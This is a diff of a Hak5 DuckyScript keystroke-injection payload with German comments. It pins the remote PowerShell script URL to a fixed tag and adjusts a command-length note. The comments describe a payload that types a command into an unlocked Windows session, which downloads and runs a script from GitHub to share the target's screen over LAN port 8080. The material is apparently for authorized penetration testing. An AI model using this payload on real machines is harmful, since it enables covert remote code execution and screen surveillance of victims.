@@ -9,8 +9,10 @@ REM        http://<LAN-IP des Ziels>:8080/
 REM
 REM  Payload: eigene, gepatchte Kopie des offiziellen Hak5-payloads
 REM  (view-only, KEINE Maus-/Tastatureingabe)
-REM  https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/HEAD/s.ps1
-REM  (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1)
+REM  https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.1/s.ps1
+REM  (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1;
+REM   der Tag v1.1 ist immutable - bei einer neuen Version einen neuen Tag
+REM   vergeben und die URL hier anpassen)
 REM
 REM  Voraussetzungen am Ziel:
 REM    * interaktive, angemeldete Desktop-Sitzung (kein Lock-Screen)
@@ -23,7 +25,7 @@ REM  ausdrueckliche Erlaubnis hast.
 REM ============================================================================
 
 REM ----------------------------- Konfiguration -------------------------------
-DEFINE #SCRIPTURL https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/HEAD/s.ps1
+DEFINE #SCRIPTURL https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.1/s.ps1
 DEFINE #PORT 8080
 
 REM -------------------------- Windows-Erkennung -----------------------------
@@ -61,7 +63,7 @@ REM  Alles, was danach kommt, wird kommentarlos abgeschnitten - der Befehl
 REM  laeuft dann unvollstaendig (z. B. mit abgeschnittener URL) und scheitert.
 REM  Ein Aufteilen in mehrere STRING-Bloecke hilft NICHT, weil sich die
 REM  Zeichen aller Bloecke im selben Eingabefeld addieren.
-REM  Der Befehl unten hat 220 Zeichen (Reserve: 39) und bleibt deshalb in
+REM  Der Befehl unten hat 213 Zeichen (Reserve: 46) und bleibt deshalb in
 REM  EINEM STRING-Block.
 REM
 REM  1) md C:\PS -Force      -> Arbeitsordner anlegen
